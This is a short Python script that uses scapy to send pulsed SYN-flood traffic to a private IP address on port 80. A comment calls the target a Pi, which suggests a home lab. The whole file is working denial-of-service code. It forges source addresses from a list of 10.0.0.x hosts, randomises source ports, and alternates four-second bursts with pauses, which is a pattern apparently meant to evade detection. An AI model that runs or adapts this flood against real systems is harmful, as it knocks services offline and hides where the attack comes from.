from scapy.all import *
import random
import socket
import time
import itertools

# Target hostname and port
target_ip = "192.168.43.108"  # Pi's hostname
target_port = 80  # Common port (HTTP)



# Fixed IP address list
FIXED_IPS = [
     "10.0.0.101",
    "10.0.0.102",
    "10.0.0.103",
    "10.0.0.104",
    "10.0.0.105",
    "10.0.0.106",
    "10.0.0.107",
    "10.0.0.108",
    "10.0.0.109",
    "10.0.0.110"
    
]

# Create infinite iterator for fixed IPs
ip_cycle = itertools.cycle(FIXED_IPS)

# Function to send SYN packets for a duration, then pause
def syn_flood(pulse_duration=4, pause_duration=4):
    try:
        while True:
            print(f"Starting SYN flood for {pulse_duration} seconds...")
            start_time = time.time()

            while time.time() - start_time < pulse_duration:
                # Get next fixed IP from iterator
                src_ip = next(ip_cycle)
                src_port = random.randint(1024, 65535)

                # Craft SYN packet
                ip = IP(src=src_ip, dst=target_ip)
                tcp = TCP(sport=src_port, dport=target_port, flags="S")
                packet = ip / tcp

                # Send packet
                send(packet, verbose=0)
                print(f"Sent SYN packet from {src_ip}:{src_port}")

            print(f"Pausing for {pause_duration} seconds...\n")
            time.sleep(pause_duration)  # Wait before the next pulse

    except KeyboardInterrupt:
        print("\nStopped by user")
    except Exception as e:
        print(f"Error: {e}")

# Run the attack in pulses
if __name__ == "__main__":
    syn_flood()

